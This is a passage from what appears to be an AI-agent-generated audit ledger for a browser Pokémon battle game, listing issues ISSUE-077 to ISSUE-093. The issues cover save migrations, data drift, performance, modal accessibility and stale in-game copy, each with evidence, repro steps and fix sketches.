The mechanics-unlock change (commit c4d6d55) makes all four gimmicks unlock together at badges>=5 via `slotsUnlocked = badges < 5 ? 0 : 4` — but this recompute lives ONLY in the battle-victory handler (`enterBattleEvent`, ~42749). `load()` (~32503) and the migration chain (v15–v21) never re-derive `sm.unlockedGimmicks` from `sm.badges`. A save written by the OLD per-badge drip (e.g. badges 6 → `['mega','dmax']`) loads unchanged:
```
After load: version 21 badges 6 unlockedGimmicks: ["mega","dmax"]
EXPECTED (post-merge, badges>=5): all 4 [mega,dmax,tera,z]
```
`_storyEnemyMechKeys` and `_mechForGimmickRoll` both read `sm.unlockedGimmicks` live, so Tera/Z capability is withheld from both player builds and enemy foes until the player wins the next milestone fight (which finally runs the new recompute).

**Repro**: `node scripts/debug/_repro/unlock-migration.mjs` — loads a `version:18` save, badges 6, `unlockedGimmicks:['mega','dmax']`; observe it stays partial after load.

**Blast radius**: Any player with an in-progress save (badges>=5) that crosses the v1.2.3 merge. Self-heals after one milestone victory, so non-catastrophic, but the headline feature (all-four-at-Colress) is silently absent for 1+ battles.

**Fix sketch**: Add a load-time/migration re-derivation: after migrations, recompute `sm.unlockedGimmicks = order.slice(0, sm.badges < 5 ? 0 : 4)` using the same `megaOn/dynaOn/teraOn/zOn` order. A `migrateStoryPreV22` is the natural home (the unlock-semantics change deserves a SAVE_VER bump anyway).

**Verification**: Re-run the repro; `unlockedGimmicks` should be `['mega','dmax','tera','z']` after load.

---

## <a id="ISSUE-078"></a> ISSUE-078: 6 builds in the gen*.json mirror omit `nature`; the CSV source has natures for all 17,398 rows (mirror drift)

---
id: ISSUE-078
severity: P2
category: inconsistency
anchor_symbol: loadBuildsCSV
current_line_hint: ~9870
file: data/builds/gen5.json
agents: [data-integrity-auditor]
fingerprint: 0c28760f1056
confidence: high
status: open
---

**Title**: 6 builds in the gen*.json mirror omit `nature`; the CSV source has natures for all 17,398 rows (mirror drift)

**Evidence**:
```js
// loadBuildsCSV defaults a blank nature to 'Hardy' (neutral):
const natureRaw = _csvDecodeOptions(row.nature, 'Hardy');   // 9870
const naturePicked = _csvPickOption(natureRaw, 'Hardy');    // 9876
// builds.csv: 0 rows with blank nature. JSON mirror: 6 builds with no nature key:
//   gen5 Aron/vgc2012/Level 1 Sturdy, gen5 Solosis/vgc2012/FEAR,
//   gen8 Mewtwo/balancedhackmons/Sheer Force, gen9 Landorus/godlygift/Nasty Plot,
//   gen9 Great Tusk/ubersuu/Choice Scarf, gen9 Iron Treads/ubersuu/Booster Speed Lead
```

**Repro**: `node` over `data/builds/gen{5,8,9}.json` — these 6 build objects lack a `nature` field. The same sets in `data/builds.csv` carry a nature.

**Blast radius**: Low for gameplay (CSV is authoritative and supplies the nature; the JSON-fallback path defaults to Hardy). But it is a symptom of CSV↔JSON drift — relevant because the retune touches natures and may regenerate one representation. Hand-editing the JSON for the retune would inherit the gap.

**Fix sketch**: Regenerate `data/builds/gen*.json` from `data/builds.csv` so every set carries the CSV's nature; or backfill the 6 missing `nature` keys to match the CSV.

**Verification**: Re-run a JSON-vs-CSV field-coverage diff; expect 0 nature-less JSON builds.

---

## <a id="ISSUE-079"></a> ISSUE-079: Engine-only `loadGameData` parse is ~308 ms (isolated from JSDOM), >1.5× the 200 ms boot target and scales with every new data table

---
id: ISSUE-079
severity: P2
category: perf
anchor_symbol: loadGameData
current_line_hint: ~9636
file: battle.html
agents: [performance-profiler]
fingerprint: 7819dea5a498
confidence: high
status: open
---

**Title**: Engine-only `loadGameData` parse is ~308 ms (isolated from JSDOM), >1.5× the 200 ms boot target and scales with every new data table

**Evidence**:
```js
// battle.html:9636 — JSON.parse of 5 tables in parallel, then per-key transform loops
const [speciesJSON, movesJSON, naturesJSON, itemsJSON, abilitiesJSON] = await Promise.all([
    fetch('data/species.json').then(r => r.json()),   // 1380 species → baseStats[]
    fetch('data/moves.json').then(r => r.json()),      // 954 moves → movesDB[]
    fetch('data/natures.json').then(r => r.json()),
    fetch('data/items.json').then(r => r.json()),
    fetch('data/abilities.json').then(r => r.json())]);
// …then await loadBuildsCSV() at battle.html:9743 parses the 2.6 MB data/builds.csv
```
Measured (jsdom, warm fetch stub serving from memory so disk I/O is excluded — this is pure parse+transform, separated from JSDOM document construction as the charter requested): re-invoking `window.loadGameData()` 5×: **median 308 ms, IQR 5.9 ms** (samples 308/314/396/306/308). The full jsdom cold boot is ~3–4 s but is dominated by JSDOM parsing the 3.6 MB monolith; this 308 ms is the slice the engine itself owns and the slice that grows when data tables are added.

**Repro**: `node --expose-gc` → `loadEngine()` → time `await window.loadGameData()` 5×; median ~308 ms. (`/tmp/final.mjs` in this session.)

**Blast radius**: This is the production boot floor minus JSDOM overhead — a real browser still pays the JSON.parse + 1380/954-key transform loops + 2.6 MB CSV parse behind the splash. It is **linear in table size**, so the redesign's egg tables, Fight Club rosters, and expanded story-pool each add directly to it. Distinct from the prior cold-boot finding (which measured the ~3 s full JSDOM boot + target mismatch); this isolates the engine's own parse budget.

**Fix sketch**: Defer the non-critical tables out of the boot path — `loadBuildsCSV()` (2.6 MB) and `op-abilities.json` are only needed at first draft/encounter, not at splash; parse them lazily on first use. Keep species/moves eager. Re-measure to confirm the eager slice stays < 200 ms as tables grow.

**Verification**: Re-time isolated `loadGameData()` after deferring the CSV; confirm the eager path is < 200 ms and that adding a redesign data table does not move it.

---

## <a id="ISSUE-080"></a> ISSUE-080: `logMsg` runs an O(903-keys) `Object.keys(tooltipDict)` scan on every log line — 0.32 ms median, 13.9 ms max per call

---
id: ISSUE-080
severity: P2
category: perf
anchor_symbol: logMsg
current_line_hint: ~14134
file: battle.html
agents: [performance-profiler]
fingerprint: 290cc0fb39e4
confidence: high
status: open
---

**Title**: `logMsg` runs an O(903-keys) `Object.keys(tooltipDict)` scan on every log line — 0.32 ms median, 13.9 ms max per call

**Evidence**:
```js
// battle.html:14148 — re-walks tooltipDict on every logMsg invocation
if (processedMsg.length < 200 && Object.keys(tooltipDict).length > 0) {
    for (let key of Object.keys(tooltipDict)) {        // 903 keys after items+abilities+natures load
        if (key.length > 3 && processedMsg.includes(key)) {
            processedMsg = processedMsg.replace(key, `<span ...>${key}</span>`);
            break;
        }
    }
}
```

There IS an existing helper `getTooltipKeysSorted()` at battle.html:9728 that caches `Object.keys(tooltipDict).filter(k => k.length > 3).sort((a,b) => b.length - a.length)` and is correctly invalidated on writes — but `logMsg` does not use it.

**Repro**: jsdom harness, populated tooltipDict (903 keys after `loadGameData`), 500 simulated `logMsg` calls hitting the same hot path: **median 0.319 ms, p95 0.597 ms, max 13.941 ms, mean 0.405 ms** (`/tmp/deep-perf4.mjs` in this session, 2026-05-28). Worst-case (no match → full scan): median 0.143 ms.

**Blast radius**: A normal turn fires 5–30 `logMsg` calls (move use, hit, crit, stat changes, status, ability procs, end-of-turn). A multi-hit move + Magic-Bounce reflect can fire 40+. At 0.3 ms each, that adds 1.5–12 ms of CPU to every turn purely from this scan. Worse: every `changeStage` (Decorate, Coaching, Calm Mind, Dragon Dance, Swords Dance, …) calls `logMsg` 1–3× — which is why the parseMoveEffects per-move benchmark shows status moves at 0.8–1.7 ms vs damage moves at 0.015 ms (a 50–100× spread). Touches every battle-log line; the highest-frequency code path in story mode.

**Fix sketch**: Switch `logMsg` to call `getTooltipKeysSorted()` (already cached + length-sorted) instead of re-doing `Object.keys` + filter on every call. Hoist the regex `/used (.+?)!/g` to a module-level constant — `String.prototype.replace` doesn't recompile but the literal still allocates per call.

**Verification**: Re-bench `logMsg` 500× after the swap; expect median to drop from 0.32 ms to under 0.05 ms (the inner `includes` loop becomes a single pass over the cached list, no `Object.keys` churn, no `filter` allocation). Parallel: re-bench `parseMoveEffects` for Decorate/Coaching/Calm Mind; expect 1.7 ms → < 0.3 ms.

---

## <a id="ISSUE-081"></a> ISSUE-081: Pre-v15 post-HoF saves are forced back through the Mystery Figure climax — postHofMysteryClimaxDone migration shadowed by default boolean

---
id: ISSUE-081
severity: P2
category: bug
anchor_symbol: migrateStoryPreV15
current_line_hint: ~32163
file: battle.html
agents: [story-mode-investigator]
fingerprint: 685e7677fbe1
confidence: high
status: open
---

**Title**: Pre-v15 post-HoF saves are forced back through the Mystery Figure climax — postHofMysteryClimaxDone migration shadowed by default boolean

**Evidence**: Same root cause as the balls-default bug. `migrateStoryPreV15` (~32163) intends to spare already-finished saves from re-running the post-HoF climax:
```js
if (typeof sm.postHofMysteryClimaxDone !== 'boolean') {
    sm.postHofMysteryClimaxDone = !!(sm.bossArc && sm.bossArc.available);
}
```
But the default `sm` initializes `postHofMysteryClimaxDone: false` (~32247) — already a boolean. After `Object.assign(sm, d)` with a pre-v15 save lacking the field, the `typeof !== 'boolean'` guard is false, so the boss-arc-aware default never runs. A pre-v15 post-HoF save (bossArc.available) loads with `postHofMysteryClimaxDone:false`.

**Repro**: `node scripts/debug/_repro/posthof-migration.mjs` → `version:14` save, `bossArc.available:true`, no `postHofMysteryClimaxDone` field → loads as `false` (migration intended `true`).

**Blast radius**: Pre-v15 players who already beat the Hall of Fame and unlocked the Caged God arc. On load they are routed back into the post-HoF Mystery Figure climax (`processNextEvent` row 67 recovery, ~38440) instead of the post-game. Disruptive but not a crash; the climax is winnable.

**Fix sketch**: Detect the missing field on the RAW save `d` (e.g. `!('postHofMysteryClimaxDone' in d)`) rather than `typeof sm.X`, since the default `sm` always supplies the field. Audit every `migrateStoryPreV*` guard of the form `if (typeof sm.X !== ...)` / `if (!sm.X)` against the default `sm` object (~32226) — `balls`, `postHofMysteryClimaxDone`, and any field the default pre-populates are subject to the same shadowing.

**Verification**: Re-run the repro; `postHofMysteryClimaxDone` should be `true` after migrating a pre-v15 post-HoF save.

---

## <a id="ISSUE-082"></a> ISSUE-082: 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby

---
id: ISSUE-082
severity: P2
category: a11y
anchor_symbol: modal-dialog-roles
current_line_hint: ~7519
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a8ccc1946cb8
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby

**Evidence**:
```
$ grep -nE 'role="dialog"' battle.html
7683:    <div id="modal-help" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="help-title">
7760:    <div id="modal-summary" class="modal hidden" role="dialog" aria-labelledby="sum-header-name" aria-modal="true">

$ grep -nE 'class="modal' battle.html | wc -l
12
```

Only `modal-help` and `modal-summary` declare themselves as dialogs. The remaining ten — `modal-settings`, `modal-story-run-summary`, `modal-story-abandon-confirm`, `modal-game-alert`, `modal-game-confirm`, `modal-online-host`, `modal-gauntlet-leaderboard`, `modal-online-pvp` (+ two more) — render as plain `<div class="modal">`. They function as modal dialogs (background blocks pointer events; titles like "Abandon this run?", "Host online battle"), so SR users get no context when they pop. `modal-game-alert` and `modal-game-confirm` are the in-page replacements for native `alert()`/`confirm()` (per the comment at line 7619) — these specifically must be dialogs.

**Repro**: Click ⚙ settings; open Story → Abandon Run; open Online → Host. SR announces "button" instead of "dialog, Settings / Abandon this run? / Host online battle".

**Blast radius**: Settings is the highest-frequency entry point. Abandon-Run is destructive. Both being unannounced is a real safety concern.

**Fix sketch**: Add `role="dialog" aria-modal="true"` to each `<div class="modal">`. Ensure the `<h2>` inside each has an `id`, and reference it via `aria-labelledby`. Centralise via `class="modal"` selector + a tiny `connectedCallback`-style init in JS so future modals inherit it.

**Verification**: `grep -cE 'class="modal[^"]*" *[^>]*role="dialog"' battle.html` returns 12.

---

## <a id="ISSUE-083"></a> ISSUE-083: Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users

---
id: ISSUE-083
severity: P2
category: a11y
anchor_symbol: modal-escape-key
current_line_hint: ~16555
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 44450b67ba55
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users

**Evidence**:
```
$ grep -nE "e.key === 'Escape'" battle.html
13021: moveOpen — closes move tooltip
16555: closes #modal-summary only
27015: closes a casino sheet (b / B / Escape)
29833: closes a one-off overlay
```

`closeModal('modal-X')` is wired up to a close button or click-on-backdrop on each modal, but the document-level Escape handler exists only for `modal-summary` (party summary). Keyboard-only players cannot dismiss `modal-settings`, `modal-game-alert`, `modal-game-confirm`, `modal-online-host`, `modal-online-pvp`, `modal-story-abandon-confirm`, `modal-story-run-summary`, or `modal-gauntlet-leaderboard` without hunting for the close button by Tab. `modal-game-alert` in particular blocks the entire game and is the in-page replacement for native `alert()` — native alerts close on Esc.

**Repro**: Open ⚙ Settings via keyboard, press Esc → nothing happens. Open Abandon Run, press Esc → nothing. Native-alert convention violated.

**Blast radius**: Every modal except summary. Pairs with the dialog-role finding (a11y users need both role + Esc).

**Fix sketch**: Generalise the `modal-summary` Escape handler into a single document-level `keydown` listener that finds the topmost non-hidden `.modal:not(.hidden)` and calls `closeModal(modal.id)`. Make sure `modal-game-confirm`'s Cancel path is invoked on Esc (since closing == cancelling).

**Verification**: Open each modal, press Esc → closes. `closeModal` runs.

---

## <a id="ISSUE-084"></a> ISSUE-084: Modals restore focus on close but never move focus INTO the dialog on open

---
id: ISSUE-084
severity: P2
category: a11y
anchor_symbol: openModal
current_line_hint: ~12995
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: c0f4bce71793
confidence: high
status: open
---

**Title**: Modals restore focus on close but never move focus INTO the dialog on open

**Evidence**:
```js
window.openModal = function(id) {
    const el = document.getElementById(id);
    if (!el) return;
    try { const prev = document.activeElement;
          if (prev && prev !== document.body) window._modalFocusStack.set(id, prev); } catch (e) {}
    el.classList.remove('hidden');   // <-- focus stays on the trigger behind the modal
};
```

**Repro**: Open Settings / Run Summary / any `role="dialog"` modal. Focus remains on the launching button behind the overlay; SR users aren't moved into the dialog and may keep reading the (now-inert) page beneath.

**Blast radius**: All `role="dialog" aria-modal="true"` modals (~20). Close-side focus *return* (L13009) and the global Escape handler (L13019) are already correct — this is only the open-side gap. The new gauntlet leaderboard/swap modals inherit this.

**Fix sketch**: In `openModal`, after unhiding, focus the dialog container (`tabindex="-1"`) or its first focusable control / close button.

**Verification**: On open, focus lands inside the dialog; on close it returns to the trigger (already works).

---

## <a id="ISSUE-085"></a> ISSUE-085: In-game help text still says "PC Storage (cap 10)" — actual PC_BOX_CAP is 30

---
id: ISSUE-085
severity: P2
category: inconsistency
anchor_symbol: PC_BOX_CAP
current_line_hint: ~10582
file: battle.html
agents: [story-mode-investigator]
fingerprint: 5f7903cb05a5
confidence: high
status: open
---

**Title**: In-game help text still says "PC Storage (cap 10)" — actual PC_BOX_CAP is 30

**Evidence**:
```js
// battle.html:10582 (story-mode help overlay)
"<b>Pokémon Center</b> — <b>PC Storage</b> (cap 10) for the partners you can't carry, ..."
// vs
const PC_BOX_CAP = 30;  // battle.html:42740
```

**Repro**: `grep -n "cap 10" battle.html`. The PC cap was raised to 30 (v-playtest per STORY_MODE_FLOW §7), the overflow modal and warning banner correctly use `PC_BOX_CAP` (42924/42938), and the catch overflow message says "(30/30)" — but the static help prose still reads "cap 10". The `inspect-save` skill doc and CODEBASE_MAP also still say cap 10 / SAVE_VER=15 (stale, separate from code).

**Blast radius**: Player-facing help under-states their storage by 3×; could prompt premature releases. Cosmetic but directly contradicts the live cap.

**Fix sketch**: Replace the literal "cap 10" in the help string with "cap ${PC_BOX_CAP}" (or the literal 30). Sweep for other "cap 10" / "10/10" prose.

**Verification**: `grep -n "cap 10\|10/10" battle.html` returns no user-facing PC strings.

---

## <a id="ISSUE-086"></a> ISSUE-086: Nurse Joy first-Center tutorial says PC has "ten slots" but PC_BOX_CAP is 30

---
id: ISSUE-086
severity: P2
category: inconsistency
anchor_symbol: playStoryTutorial
current_line_hint: ~36972
file: battle.html
agents: [consistency-auditor]
fingerprint: 4b71628ae0f5
confidence: high
status: open
---

**Title**: Nurse Joy first-Center tutorial says PC has "ten slots" but PC_BOX_CAP is 30

**Evidence**:
```js
// firstPokemonCenter tutorial (line ~36972)
'"Upstairs is the PC: ten slots of cold storage for every partner you\'ve caught but can\'t field today. Deposit, withdraw, release — the usual courtesies."',
// but the actual cap (line ~43126):
const PC_BOX_CAP = 30;
// and the PC tab UI + main help both say 30:
//   line ~10651: "<b>PC Storage</b> (cap 30) ..."
//   line ~43331: <span>PC <strong>${box.length}/${PC_BOX_CAP}</strong></span>
```

**Repro**: Start a fresh story run, reach the first Pokémon Center; Nurse Joy's tutorial reads "ten slots." Open the PC tab on the same screen — header shows "/30," and the main help text says "(cap 30)."

**Blast radius**: Player-facing copy only (the tutorial is purely narrative; capacity logic uses `PC_BOX_CAP`). No gameplay effect, but the onboarding line actively misinforms about the storage limit — the same "10 vs 30" contradiction the prior ledger flagged for the help text, fixed everywhere except this tutorial string.

**Fix sketch**: Change "ten slots" to "thirty slots" (or a cap-agnostic phrasing like "a wall of cold storage") in the `firstPokemonCenter` tutorial line so it matches `PC_BOX_CAP` and the rest of the UI.

**Verification**: Grep `ten slots` returns no hits; load a fresh run and confirm the Nurse Joy line no longer says "ten." Optionally assert the tutorial string contains no hardcoded slot count.

---

## <a id="ISSUE-087"></a> ISSUE-087: Turn-loop median **23–38 ms / p95 35–53 ms / max 46–58 ms** in jsdom — production with `settings.animations=true` adds bounded `sleep()` delays on top, but the jsdom number IS the production floor when animations are off

---
id: ISSUE-087
severity: P2
category: perf
anchor_symbol: playTurn
current_line_hint: ~20409
file: battle.html
agents: [performance-profiler]
fingerprint: 95c389cb86e5
confidence: high
status: open
---

**Title**: Turn-loop median **23–38 ms / p95 35–53 ms / max 46–58 ms** in jsdom — production with `settings.animations=true` adds bounded `sleep()` delays on top, but the jsdom number IS the production floor when animations are off

**Evidence**: 60-turn (single trial) and 30×5-trial measurements, jsdom harness, `settings.animations=false`, `sleep()` short-circuited to `Promise.resolve()` by load-engine.js (so we measure pure CPU, not animation timing):

Run A (`/tmp/deep-perf5.mjs`, 60 turns, 5 warmup): n=60 median **22.41**, p95 **35.08**, max **43.50**, mean **22.70**, range 1.9× median→max.

Run B (`/tmp/turnloop.mjs`, 30×5=150 samples, 10 warmup): n=150 median **37.63**, p95 **42.54**, max **46.46**, min **5.78**, IQR **17.07**.

Top 5 slowest turns from a 60-turn pass: turns 4 (43.5), 1 (39.9), 0 (35.1), 36 (34.2), 12 (33.8) — first-3 outliers are JIT warmup leftovers; the turn-12/36 outliers are post-warmup and point at non-deterministic branches (status moves with multiple `changeStage` + `logMsg` calls).

```js
// battle.html:20409 — playTurn enters here, then calls __runLockedPvPTurnResolution
// which calls performAction (battle.html:21286, 3358 lines long) which calls parseMoveEffects
// (battle.html:25853) per move, all under one async/await chain.
window.playTurn = async function(pMoveIndex, pSwitchIndex) {
    if(state.isLocked) return;
    if (state.isOver) return;
    ...
    await window.__runLockedPvPTurnResolution();
};
```

**Repro**: `/tmp/turnloop.mjs` + `/tmp/deep-perf5.mjs`, both this session, 2026-05-28. The harness uses jsdom which is **~2–3× slower than a modern Chromium DOM** for `appendChild`/`createElement`, so production browser numbers should be lower in absolute terms BUT animations move them back up.

**Blast radius**: ~30 ms / turn × 30 turns per battle × 100 battles per run ≈ 90 seconds of pure CPU per playthrough — invisible to the user when distributed across input pauses. The risk is the **distribution**: with median 22 ms but p95 42 ms, ~5% of turns will visibly stall (>1 dropped frame at 60 Hz). Production with `settings.animations=true` adds bounded `sleep()` delays — those are pacing, not CPU work — so the floor stays here. Bound to ISSUE-062 (existing P2 noting max 78-84ms outliers).

**Fix sketch**: Two compounding levers: (1) fix the logMsg tooltipDict scan (fingerprint 290cc0fb39e4 above) — drops every turn that has 5+ logMsg calls by 1.5+ ms; (2) cache the `_isPlayer ? state.pSide : state.fSide` and `state.terrain === "Electric" && state.terrainTurns > 0` predicates that recur dozens of times across parseMoveEffects branches (currently re-evaluated per branch).

**Verification**: Re-bench `/tmp/turnloop.mjs` after the logMsg fix; expect median to drop from 22 → ~15 ms and p95 from 42 → ~28 ms. Long-tail (max) should improve more than median because slow turns are the ones with the most logMsg/stat-change traffic.

---

## <a id="ISSUE-088"></a> ISSUE-088: 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json`

---
id: ISSUE-088
severity: P2
category: data
anchor_symbol: POKEMART_ITEMS
current_line_hint: ~28876
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 8d497740c197
confidence: medium
status: open
---

**Title**: 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json`

**Evidence**:
```js
// battle.html POKEMART_ITEMS + DEPT_ITEMS (verified ids):
// pokeBall    -> items.json: present (pokeball)
// greatBall   -> items.json: present (greatball)
// potion, superPotion, hyperPotion, maxPotion, fullRestore, fullHeal,
// ether, elixir, maxElixir, xAttack, xDefense, xSpAtk, xSpDef, xSpeed,
// xAccuracy, direHit, guardSpec, revivalHerb, revive, maxRevive,
// sunOrb, rainOrb, hailOrb, sandOrb, electricOrb, grassyOrb,
// psychicOrb, mistyOrb, emergencyTeleporter -> ALL MISSING from items.json
```

**Repro**: `node -e` lookup against `data/items.json` flattened keys for each mart id reports MISSING for everything except `pokeBall` and `greatBall`. See `battle.html:28876-28910`.

**Blast radius**: The mart catalog is self-contained (each row has `id`, `name`, `desc`, `effect`), so the shop works fine without items.json. The only consumer that reaches into items.json is the tooltip dictionary in `loadGameData` (sets `tooltipDict[it.name] = it.shortDesc`); mart items use their own `desc` field, so this works too. However, any future feature that uniformly walks `items.json` to render bag UI, drop tables, or inventory analytics will see a phantom-item population — bag items and held items live in two disjoint universes.

**Fix sketch**: Either (a) add the 29 missing entries to `data/items.json` so the catalog is the single source of truth for item metadata; or (b) document explicitly in a `data/README.md` (or schema note) that `items.json` covers only held-items / berries and that bag/shop consumables live exclusively in `POKEMART_ITEMS` and `DEPT_ITEMS`. Option (b) is much cheaper and matches the historical architecture.

**Verification**: If option (a), the mart-coverage check (added to `scripts/debug/data-validator.mjs`) should pass. If option (b), the README addition is the deliverable; no code change.

---

## <a id="ISSUE-089"></a> ISSUE-089: Mart/Dept consumables (30 ids: potion, xAttack, sunOrb, evResetCharm…) are a self-contained namespace, NOT entries in items.json

---
id: ISSUE-089
severity: P2
category: data
anchor_symbol: POKEMART_ITEMS
current_line_hint: ~29934
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 4177b7fb1027
confidence: high
status: open
---

**Title**: Mart/Dept consumables (30 ids: potion, xAttack, sunOrb, evResetCharm…) are a self-contained namespace, NOT entries in items.json

**Evidence**:
```js
const POKEMART_ITEMS = [
  { id:'pokeBall', ..., kind:'ball', ballKey:'poke' },
  { id:'potion', ..., effect:'heal20' },   // <- effect handler inline, not in items.json
  ...
];
// Cross-ref: 30/32 mart+dept ids resolve via inline 'effect'/'kind'; only
// pokeBall + greatBall map to items.json. STONE_SHOP_ITEMS: 24/24 resolve.
```

**Repro**: Cross-reference `[...POKEMART_ITEMS, ...DEPT_ITEMS]` ids against `data/items.json` (normalized) — 30 ids (all consumables/orbs/X-items) are absent; they carry inline `effect`/`kind` handlers instead.

**Blast radius**: Documentation/clarity only — these are intentionally engine-defined consumables with inline handlers, so a literal "mart id must exist in items.json" check yields 30 false positives. items.json is the competitive held-item/berry/ball dataset, not the shop-consumable catalog. Held-item/berry/ball handler coverage (check #8) is satisfied: balls route through `ballKey`, and the only items.json-backed mart entries are the two balls.

**Fix sketch**: No code change needed. Note in the data-validator / REDESIGN docs that POKEMART_ITEMS/DEPT_ITEMS consumables are a distinct namespace from items.json so future audits don't flag them; if a unified registry is desired later, add a `source` tag.

**Verification**: N/A (informational). Confirm STONE_SHOP_ITEMS (24/24) and the two balls remain the only items.json-backed shop ids.

---

## <a id="ISSUE-090"></a> ISSUE-090: README calls catch / PC / Underground / Safari / boss-arc "upcoming"; all are shipped

---
id: ISSUE-090
severity: P2
category: inconsistency
anchor_symbol: README
current_line_hint: n/a
file: README.md
agents: [spec-drift-auditor]
fingerprint: 61ee59240f4d
confidence: high
status: open
---

**Title**: README calls catch / PC / Underground / Safari / boss-arc "upcoming"; all are shipped

**Evidence**:
```text
README.md:44  "See `STORY_MODE_FLOW.md` for the working spec of the UPCOMING
              catch / PC / Underground / Safari / boss-arc systems."
```
```js
// All shipped in battle.html (samples):
//   #screen-story-catch (7 refs), enterSafari (4), SAFARI_MAX_ENCOUNTERS,
//   _bossArc* (15 refs), "Subject Zero" (23 refs), PC_BOX_CAP = 30,
//   _WILD_GRADE_CURVE_BY_BADGES, Crucible (67 refs), enterPits, enterDaycare.
//   SAVE_VER = 21 (the catch/PC schema landed at v15).
```

**Repro**: `grep -cE 'screen-story-catch|enterSafari|Subject Zero|PC_BOX_CAP' battle.html` → all non-zero.

**Blast radius**: README is the entry doc; "upcoming" implies these systems are unbuilt when they are fully in the live build. Misleads new contributors and undercuts the (now de-scoped) distinction. Task check #6 ("every feature mentioned in README must be reachable from UI"): the *only* forward-looking claim is this "upcoming" sentence — and the features it names ARE reachable; the word "upcoming" is the defect.

**Fix sketch**: Reword README line 44 to "See `STORY_MODE_FLOW.md` for the spec of the catch / PC / Underground / Safari / boss-arc systems (shipped)."

**Verification**: README no longer labels shipped systems as upcoming.

---

## <a id="ISSUE-091"></a> ISSUE-091: City-hub Mystery Figure NPC sprite is hard-coded to Cyrus, ignoring `sm.mysteryIdentity` rotation

---
id: ISSUE-091
severity: P2
category: bug
anchor_symbol: renderCityActions
current_line_hint: ~35956
file: battle.html
agents: [story-mode-investigator]
fingerprint: 387fecfc77f7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: City-hub Mystery Figure NPC sprite is hard-coded to Cyrus, ignoring `sm.mysteryIdentity` rotation

**Evidence**:
```js
// battle.html ~35947 (renderCityActions, "swap mode" branch)
let spriteTrainerArg = { spriteFile: CITY_GUIDE_SPRITES[...] };
if (hasProf && !profUsedHere) {
    if (hasTeamRoom) {
        const hub = cityProfessorHubSlot(cityIdx);
        speakerLabel = hub.label;
        spriteTrainerArg = { spriteFile: hub.spriteFile };
    } else {
        speakerLabel = '???';
        spriteTrainerArg = 'Cyrus';     // ← hard-coded
    }
}
```
The Professor screen (battle.html ~36929) correctly uses `_storyEnsureMysteryIdentity()` for the sprite. The hub branch does not. So at City 8 + 8 badges, the hub NPC says ??? next to a Cyrus sprite even when `sm.mysteryIdentity === 'red'` and the upcoming Mystery Figure battle will show Red.

**Repro**: `?debugMystery=1` → seed legendary-gate state → enter City 8 hub. The hub sprite is Cyrus regardless of which identity was rolled at run start.

**Blast radius**: Cosmetic only — battle still works. Specifically affects 8 of 9 possible rolled identities (`ghetsis`/`cynthia`/`steven`/`n`/`red`/`lance`/`buried_alive`/`cartridge_self`) — the hub sprite is wrong for every variant except `cyrus`. Mild lore-coherence issue, since the Mystery Figure rotation was the explicit fix for the prior audit's "Mystery Figure sprite unconditionally Cyrus" finding (now fixed in the battle path, missed in the hub).

**Fix sketch**: Replace `spriteTrainerArg = 'Cyrus'` with `spriteTrainerArg = (_storyEnsureMysteryIdentity() || { sprite: 'Cyrus' }).sprite ?? 'Cyrus'` (mirror the Professor screen's hub picker exactly).

**Verification**: Force `sm.mysteryIdentity = 'red'` via DevTools, then re-render the City 8 swap hub. Sprite should be Red.

---

## <a id="ISSUE-092"></a> ISSUE-092: Pokémon Center copy promises a "Heal" that no longer exists (full-heal is automatic)

---
id: ISSUE-092
severity: P2
category: bug
anchor_symbol: renderCityActions
current_line_hint: ~38999
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4fc1e6825b2d
confidence: high
status: open
---

**Title**: Pokémon Center copy promises a "Heal" that no longer exists (full-heal is automatic)

**Evidence**:
```js
// renderCityActions — button comment + label
// Pokémon Center — full party heal, free, unlimited
_push('recover', makeActionBtn('🏥 Pokémon Center','center','window.StoryMode.enterPokemonCenter()','center', _facOpts('center', [{label:'Free',tone:'free'}])));
// city tip (line ~38717), shown when a rival is at the route gate:
const _healTipLabel = _willFireWildNext ? 'Heal — your rival waits at the end of the road' : 'Heal — your rival is at the route gate';
```

**Repro**: STORY_MODE_FLOW §7 states the Center has "No heal function — full-heal between battles is universal." The Center screen (battle.html:8486–8508) has exactly three tabs — PC Storage / Underground / Rivalry — and no heal action. Yet the button comment says "full party heal", the meta badge is "Free", and the rival-gate tip literally reads "Heal — …" and routes to `enterPokemonCenter()`. A player who clicks "Heal" lands on the PC screen with nothing to heal.

**Blast radius**: First-time-player confusion; contradicts the canonical spec's headline mechanic (attrition removed). Pure copy/comment drift — no functional bug, but actively misleading.

**Fix sketch**: Reword the rival-gate tip to "Manage party / PC — your rival waits…" (or drop the tip), and update the button comment. If a heal affordance is desired for UX comfort, it would be a no-op (already full HP) so better to remove the word "Heal".

**Verification**: Walk to a pre-rival hub; confirm the tip no longer says "Heal"; confirm the Center screen shows no heal control.

---

## <a id="ISSUE-093"></a> ISSUE-093: `_trainerPoolCache` is an unbounded Map (keyed on type+gens) with no eviction — Fight Club draft / story-pool variety will grow it without limit

---
id: ISSUE-093
severity: P2
category: perf
anchor_symbol: rollTrainerTeam
current_line_hint: 33916
file: battle.html
agents: [performance-profiler]
fingerprint: 67d442f2bbd6
confidence: high
status: open
---

**Title**: `_trainerPoolCache` is an unbounded Map (keyed on type+gens) with no eviction — Fight Club draft / story-pool variety will grow it without limit

**Evidence**:
```js
// battle.html:33916 — module-level, never cleared
const _trainerPoolCache = new Map();
// rollTrainerTeam builds T={1,2,3,4} partitions over ~1380 species per novel key:
//   const _poolKey = (isMixed?'mixed':types.sort().join('+')) + '|' + gensSorted.join(',');
//   let T = _trainerPoolCache.get(_poolKey); if (!T) { ...full baseStats scan...; _trainerPoolCache.set(_poolKey, T); }
